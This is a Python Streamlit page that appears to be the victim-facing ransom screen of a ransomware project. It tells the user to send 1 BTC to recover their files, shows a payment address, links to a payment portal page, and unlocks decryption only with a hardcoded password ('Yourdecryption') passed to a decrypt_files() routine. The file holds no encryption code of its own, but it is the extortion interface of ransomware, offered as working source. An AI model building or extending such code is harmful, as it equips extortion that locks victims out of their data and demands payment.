import streamlit as st
import os
import subprocess
import platform
from decrypt import decrypt_files

st.set_page_config(page_title="🔓 Decrypt Files", layout="centered", initial_sidebar_state="collapsed")
st.title("Decrypt_files")

st.markdown("""
    <style>
    body, .stApp {
        background-color: black;
        color: #FFFFF0;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    h1, h2, h3, h4, h5, h6 {
        color: #FFFFF0;
    }

    .stButton button {
        background-color: black;
        color: #3399ff;
        border: 2px solid #000000;
        border-radius: 6px;
        padding: 10px 25px;
        font-size: 16px;
        transition: background-color 0.3s ease, color 0.3s ease;
    }

    .stButton button:hover {
        background-color: #111111;
        border-color: #3399ff;
        color: #66CCFF;
    }

    .red-warning {
        color: red;
        font-size: 18px;
        padding: 10px 0;
    }

    p {
        font-size: 18px;
    }

    a {
        color: white !important;
        text-decoration: none;
    }
    a:hover {
        text-decoration: underline;
        color: #cccccc !important;
    }
    </style>
""", unsafe_allow_html=True)

st.subheader("🔓 Decrypt Files")
st.markdown("""
<p>To recover your files, send 1 BTC via this portal</p>
<p style='color:green;'>#gj236gbbjw88290sbbjsjd37yew8wbssu38eddkkn</p>
<p>Copy this address before entering payment portal</p>
""", unsafe_allow_html=True)

if st.button("Payment Portal"):
    st.session_state["source"] = "Decrypt_files"
    st.switch_page("pages/Payment.py")

string = st.text_input("Enter decryption password", type="password")
if st.button("Decrypt Now"):
    if not string:
        st.markdown("<p class='red-warning'>⚠️ Please enter the decryption password.</p>", unsafe_allow_html=True)
    elif string == "Yourdecryption":
        result = decrypt_files()
        st.success(result)
        if result == "Success":
            st.markdown("""
            <p>Click here to view your files.</p>
            """, unsafe_allow_html=True)
            st.page_link("pages/View_files.py", label="View Files")
    else:
        st.markdown("<p class='red-warning'>❌ Incorrect password. Decryption failed.</p>", unsafe_allow_html=True)
